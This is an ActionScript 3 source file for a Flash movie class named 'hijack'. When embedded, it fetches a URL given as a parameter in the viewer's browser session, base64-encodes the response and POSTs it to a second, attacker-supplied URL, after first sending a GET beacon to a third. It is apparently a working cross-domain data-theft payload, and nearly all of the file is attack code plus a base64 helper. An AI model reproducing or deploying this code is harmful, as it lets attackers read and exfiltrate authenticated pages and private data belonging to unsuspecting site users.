package {
    import flash.display.Sprite;
    import flash.events.Event;
    import flash.net.*;
	import flash.utils.ByteArray;
    import flash.text.TextField; 
    public class hijack extends Sprite
    {
		private static const _encodeChars:Vector.<int> = _initEncoreChar();
        public function hijack()
        {
            var params:Object=root.loaderInfo.parameters;
			var jpg:URLRequest = new URLRequest(params.jpg);
            jpg.method = URLRequestMethod.GET;
            sendToURL(jpg);
			
            var request:URLRequest = new URLRequest(params.get);
            request.method = URLRequestMethod.GET;
            var loader:URLLoader=new URLLoader();
            loader.addEventListener(Event.COMPLETE,completeHandler);
            function completeHandler(event:Event):void{
				var data:String=(loader.data);

				var postURLrequest:URLRequest = new URLRequest(params.post);
				postURLrequest.method = URLRequestMethod.POST;
				var postdata:Object = new Array();
				postdata[0]=encode(data);
				postURLrequest.data = postdata[0];
				sendToURL(postURLrequest);
            }
            loader.load(request);
        }
		
		public static function encode(data:String):String {
			var bytes:ByteArray = new ByteArray();
			bytes.writeUTFBytes(data);
			return encodeByteArray(bytes);
		}
		
		public static function encodeByteArray(data:ByteArray):String {
			var out:ByteArray = new ByteArray();
			//Presetting the length keep the memory smaller and optimize speed since there is no "grow" needed
			out.length = (2 + data.length - ((data.length + 2) % 3)) * 4 / 3; //Preset length //1.6 to 1.5 ms
			var i:int = 0;
			var r:int = data.length % 3;
			var len:int = data.length - r;
			var c:uint; //read (3) character AND write (4) characters
			var outPos:int = 0;
			while(i < len) {
				//Read 3 Characters (8bit * 3 = 24 bits)
				c = data[int(i++)] << 16 | data[int(i++)] << 8 | data[int(i++)];

				out[int(outPos++)] = _encodeChars[int(c >>> 18)];
				out[int(outPos++)] = _encodeChars[int(c >>> 12 & 0x3f)];
				out[int(outPos++)] = _encodeChars[int(c >>> 6 & 0x3f)];
				out[int(outPos++)] = _encodeChars[int(c & 0x3f)];
			}

			//Need two "=" padding
			if(r == 1) {
				//Read one char, write two chars, write padding
				c = data[int(i)];

				out[int(outPos++)] = _encodeChars[int(c >>> 2)];
				out[int(outPos++)] = _encodeChars[int((c & 0x03) << 4)];
				out[int(outPos++)] = 61;
				out[int(outPos++)] = 61;
			}

			//Need one "=" padding
			else if(r == 2) {
				c = data[int(i++)] << 8 | data[int(i)];

				out[int(outPos++)] = _encodeChars[int(c >>> 10)];
				out[int(outPos++)] = _encodeChars[int(c >>> 4 & 0x3f)];
				out[int(outPos++)] = _encodeChars[int((c & 0x0f) << 2)];
				out[int(outPos++)] = 61;
			}

			return out.readUTFBytes(out.length);
		}
		
		private static function _initEncoreChar():Vector.<int> {
			var encodeChars:Vector.<int> = new Vector.<int>(64, true);

			// We could push the number directly
			// but I think it's nice to see the characters (with no overhead on encode/decode)
			var chars:String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
			for(var i:int = 0; i<64; i++) {
				encodeChars[i] = chars.charCodeAt(i);
			}

			return encodeChars;
		}
		
		
	
    }
}